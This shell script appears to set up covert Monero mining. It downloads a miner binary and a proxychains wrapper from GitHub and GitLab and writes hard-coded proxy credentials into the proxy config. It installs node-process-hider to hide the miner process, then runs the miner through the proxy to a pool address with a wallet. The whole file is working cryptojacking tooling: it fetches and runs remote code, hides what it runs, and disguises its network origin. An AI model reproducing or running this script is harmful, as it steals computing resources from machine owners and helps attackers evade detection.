proxy="144.168.217.88" 
port="8780" 
user="lopokoki009"  
pass="lopokoki010"
wget -q -O revez 'https://github.com/beranisalah/hee/raw/main/xmbin' && chmod +x revez
wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/panel' && chmod +x panel 
wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/proxychains.conf' && chmod +x proxychains.conf 
wget -q 'https://gitlab.com/meldiyunrianto/nimik/-/raw/main/libproxychains4.so' && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf"  
sleep 11 
echo "**********************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
apt update -y && apt upgrade -y && apt install -y nodejs && apt install -y npm && npm i -g updates && npm i -g node-process-hider && ph add revez && ./panel ./revez --url 45.76.89.70:80 --user 89XsXBTmSdMbLFh8TfCWLBDXrWDN6arjEZdCtW6ZSQmMguE8oJV5qjxJpoiAinNoMaUq3GhcsXqvWc2BurXRtnnNQxsfRNi --pass $(echo $(shuf -i 1-20000 -n 1)) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
